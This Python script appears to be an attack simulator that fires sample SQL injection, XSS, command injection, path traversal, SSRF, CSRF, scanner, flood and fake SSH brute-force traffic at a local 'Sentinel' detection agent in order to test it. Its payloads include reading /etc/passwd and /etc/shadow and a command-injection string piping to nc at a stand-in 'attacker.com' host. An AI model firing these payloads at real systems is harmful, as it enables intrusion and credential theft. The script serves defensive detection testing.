import subprocess
import time
import sys
import os

TARGET = os.getenv("TEST_TARGET", "http://localhost:80")

ATTACKS = {
    "1": {
        "name": "SQL Injection",
        "description": "Injects SQL commands via URL parameters",
        "expected_detection": "SQL Injection | Severity: HIGH",
        "requests": [
            ("GET", f"{TARGET}/search?q=admin'%20UNION%20SELECT%20*%20FROM%20users--", None, None),
            ("GET", f"{TARGET}/products?id=1%20DROP%20TABLE%20users", None, None),
            ("POST", f"{TARGET}/login", "username=admin'%20OR%20'1'='1&password=test", None),
        ]
    },
    "2": {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Injects JavaScript via URL parameters",
        "expected_detection": "Stored XSS | Severity: HIGH",
        "requests": [
            ("GET", f"{TARGET}/search?q=<script>alert('xss')</script>", None, None),
            ("GET", f"{TARGET}/comment?text=<img%20src=x%20onerror=alert(1)>", None, None),
            ("GET", f"{TARGET}/input?val=javascript:alert('xss')", None, None),
            ("GET", f"{TARGET}/profile?name=<script>document.cookie</script>", None, None),
        ]
    },
    "3": {
        "name": "Command Injection",
        "description": "Injects shell commands via URL parameters",
        "expected_detection": "Command Injection | Severity: CRITICAL",
        "requests": [
            ("GET", f"{TARGET}/ping?host=localhost;cat%20/etc/passwd", None, None),
            ("GET", f"{TARGET}/exec?cmd=$(whoami)", None, None),
            ("GET", f"{TARGET}/run?input=test|nc%20attacker.com%2080", None, None),
        ]
    },
    "4": {
        "name": "Directory Traversal",
        "description": "Attempts to access files outside web root",
        "expected_detection": "Directory Traversal | Severity: HIGH",
        "requests": [
            ("GET", f"{TARGET}/file?path=../../etc/passwd", None, None),
            ("GET", f"{TARGET}/download?file=..%2F..%2F..%2Fetc%2Fshadow", None, None),
            ("GET", f"{TARGET}/read?name=../../../../proc/self/environ", None, None),
        ]
    },
    "5": {
        "name": "SSRF (Server-Side Request Forgery)",
        "description": "Forces server to make requests to internal resources",
        "expected_detection": "SSRF | Severity: CRITICAL",
        "requests": [
            ("GET", f"{TARGET}/proxy?url=http://127.0.0.1:8000/api/health", None, None),
            ("GET", f"{TARGET}/fetch?target=file:///etc/passwd", None, None),
            ("GET", f"{TARGET}/load?src=http://0.0.0.0/internal", None, None),
        ]
    },
    "6": {
        "name": "Automated Scanner",
        "description": "Simulates known scanner tool signatures via User-Agent",
        "expected_detection": "Automated Scanner | Severity: HIGH",
        "requests": [
            ("GET", f"{TARGET}/", None, "sqlmap/1.5.2"),
            ("GET", f"{TARGET}/", None, "Nikto/2.1.5"),
            ("GET", f"{TARGET}/admin", None, "python-requests/2.28.0"),
            ("GET", f"{TARGET}/", None, "Nuclei - Open-source project"),
        ]
    },
    "7": {
        "name": "DDoS (High Request Rate)",
        "description": "Sends 60 rapid concurrent requests to trigger rate detection",
        "expected_detection": "DDoS Attack | Severity: CRITICAL",
        "requests": None  # Special case -- handled separately
    },
    "8": {
        "name": "SSH Brute Force",
        "description": "Injects SSH failed login lines into auth.log",
        "expected_detection": "SSH Brute Force | Severity: HIGH",
        "requests": None  # Special case -- handled separately
    },
    "9": {
        "name": "CSRF Attack",
        "description": "Sends requests with null Origin/Referer headers",
        "expected_detection": "CSRF | Severity: MEDIUM",
        "requests": [
            ("POST", f"{TARGET}/transfer", "amount=9999&to=attacker", None),
            ("POST", f"{TARGET}/settings", "email=hacker@evil.com", None),
        ]
    },
    "10": {
        "name": "Directory Enumeration",
        "description": "Scans common admin and config paths",
        "expected_detection": "Automated Scanner | Severity: HIGH",
        "requests": [
            ("GET", f"{TARGET}/admin", None, None),
            ("GET", f"{TARGET}/wp-admin", None, None),
            ("GET", f"{TARGET}/phpmyadmin", None, None),
            ("GET", f"{TARGET}/.env", None, None),
            ("GET", f"{TARGET}/config.php", None, None),
            ("GET", f"{TARGET}/.git/config", None, None),
            ("GET", f"{TARGET}/shell.php", None, None),
            ("GET", f"{TARGET}/backup.sql", None, None),
        ]
    },
    "0": {
        "name": "Run ALL attacks in sequence",
        "description": "Runs all 10 attack types one after another",
        "requests": None
    }
}


def send_request(method, url, data=None, user_agent=None):
    """Send a single HTTP request and print what is being sent."""
    cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
           "--max-time", "5", "-X", method]

    if user_agent:
        cmd += ["-A", user_agent]
        print(f"  Request : {method} {url}")
        print(f"  Header  : User-Agent: {user_agent}")
    else:
        print(f"  Request : {method} {url}")

    if data:
        cmd += ["--data", data]
        print(f"  Body    : {data}")

    cmd.append(url)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        status = result.stdout.strip()
        print(f"  Response: HTTP {status}")
    except subprocess.TimeoutExpired:
        print("  Response: timeout")
    except Exception as e:
        print(f"  Response: error -- {e}")


def run_ddos():
    """Send 60 concurrent requests."""
    print(f"  Sending 60 concurrent requests to {TARGET}/")
    print(f"  This will trigger the DDoS threshold (50 req/10s)")
    procs = []
    for i in range(60):
        cmd = ["curl", "-s", "-o", "/dev/null", "--max-time", "5", f"{TARGET}/"]
        procs.append(subprocess.Popen(cmd))
    for p in procs:
        try:
            p.wait(timeout=10)
        except Exception:
            p.kill()
    print(f"  Sent: 60 concurrent requests")


def run_ssh_brute_force():
    """Inject SSH brute force lines into auth.log via docker exec."""
    print("  Injecting 10 SSH brute force lines into /var/log/auth.log")
    print("  Log line: Failed password for root from 203.0.113.99 port XXXXX ssh2")

    script = """
for i in $(seq 1 10); do
    echo "$(date '+%b %d %H:%M:%S') server sshd[$$]: Failed password for root from 203.0.113.99 port 4444$i ssh2" >> /var/log/auth.log
    sleep 0.2
done
echo "Done"
"""
    try:
        result = subprocess.run(
            ["docker", "exec", "sentinel-agent", "bash", "-c", script],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            print("  Injected: 10 lines into auth.log")
        else:
            print(f"  Error: {result.stderr.strip()}")
            print("  Make sure Docker container is running: docker-compose up -d")
    except FileNotFoundError:
        print("  Error: docker command not found")
    except Exception as e:
        print(f"  Error: {e}")


def watch_logs(seconds=5):
    """Watch docker logs for ATTACK lines."""
    print(f"\n  Watching sentinel logs for {seconds} seconds...")
    print("  " + "-" * 50)
    try:
        result = subprocess.run(
            ["docker", "logs", "--tail", "50", "sentinel-agent"],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.split("\n") + result.stderr.split("\n")
        attack_lines = [
            l for l in lines
            if any(tag in l for tag in ["[ATTACK]", "[BAN]", "[FIREWALL]", "[REPEAT]", "[AUTO]"])
        ]
        if attack_lines:
            for line in attack_lines[-10:]:
                print(f"  LOG: {line}")
        else:
            print("  No [ATTACK] lines found yet -- may take a moment")
            print("  Run: docker-compose logs -f sentinel-agent | grep ATTACK")
    except Exception as e:
        print(f"  Could not read logs: {e}")
    print("  " + "-" * 50)


def run_attack(key):
    """Run a single attack by key."""
    attack = ATTACKS[key]
    print(f"\n{'='*60}")
    print(f"  ATTACK: {attack['name']}")
    print(f"  INFO  : {attack['description']}")
    print(f"  EXPECT: {attack.get('expected_detection', 'varies')}")
    print(f"{'='*60}")

    if key == "7":
        run_ddos()
    elif key == "8":
        run_ssh_brute_force()
    elif attack["requests"]:
        for i, req in enumerate(attack["requests"], 1):
            method, url, data, ua = req
            print(f"\n  --- Request {i}/{len(attack['requests'])} ---")
            send_request(method, url, data, ua)
            time.sleep(0.5)

    time.sleep(2)
    watch_logs(seconds=3)


def print_menu():
    """Print the attack selection menu."""
    print("\n" + "="*60)
    print("  SENTINEL AGENT - ATTACK SIMULATOR")
    print("="*60)
    for key, attack in ATTACKS.items():
        if key == "0":
            print(f"\n  [0] {attack['name']}")
        else:
            print(f"  [{key}] {attack['name']}")
    print("\n  [q] Quit")
    print("="*60)


def main():
    print("\nSentinel Attack Simulator")
    print("Make sure Sentinel is running: docker-compose up -d")
    print(f"Target: {TARGET}")

    while True:
        print_menu()
        choice = input("\nSelect attack type: ").strip().lower()

        if choice == "q":
            print("Exiting.")
            break
        elif choice == "0":
            print("\nRunning all attacks in sequence...")
            for key in [str(i) for i in range(1, 11)]:
                run_attack(key)
                print(f"\nWaiting 3 seconds before next attack...")
                time.sleep(3)
            print("\nAll attacks complete.")
        elif choice in ATTACKS:
            run_attack(choice)
            input("\nPress Enter to return to menu...")
        else:
            print("Invalid choice. Please select a number from the menu.")


if __name__ == "__main__":
    main()
